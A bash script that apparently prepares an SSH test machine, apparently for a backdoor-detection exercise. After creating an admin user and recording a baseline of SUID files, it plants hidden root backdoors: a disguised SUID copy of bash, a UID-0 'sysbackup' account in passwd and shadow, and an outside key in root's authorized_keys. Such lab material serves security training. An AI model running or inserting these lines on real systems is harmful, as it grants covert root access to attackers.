#!/bin/bash
set -e
rm -f /etc/ssh/sshd_config.d/*permitrootlogin*.conf
install -d -m 700 /etc/lt-ssh-test
for u in admin; do
  id "$u" >/dev/null 2>&1 || useradd -m -s /bin/bash "$u"
  [ -f /etc/lt-ssh-test/$u ] || ssh-keygen -q -t ed25519 -N '' -C "$u@helpdesk" -f /etc/lt-ssh-test/$u
  install -d -m 700 -o "$u" -g "$u" /home/$u/.ssh
  install -m 600 -o "$u" -g "$u" /etc/lt-ssh-test/$u.pub /home/$u/.ssh/authorized_keys
done
systemctl enable --now sshd
for i in $(seq 1 20); do ss -ltn | grep -q ':22 ' && break; sleep 0.5; done
usermod -aG wheel admin
find / -xdev -perm -4000 -type f 2>/dev/null | sort > /root/.lt-suid-baseline
cp /usr/bin/bash /usr/local/bin/.update-helper && chmod 4755 /usr/local/bin/.update-helper
echo 'sysbackup:x:0:0:system backup:/root:/bin/bash' >> /etc/passwd
echo 'sysbackup:$6$abc$xyz:19000:0:99999:7:::' >> /etc/shadow
ssh-keygen -q -t ed25519 -N '' -C 'x@203.0.113.66' -f /tmp/.k && install -d -m 700 /root/.ssh && cat /tmp/.k.pub >> /root/.ssh/authorized_keys && rm -f /tmp/.k /tmp/.k.pub
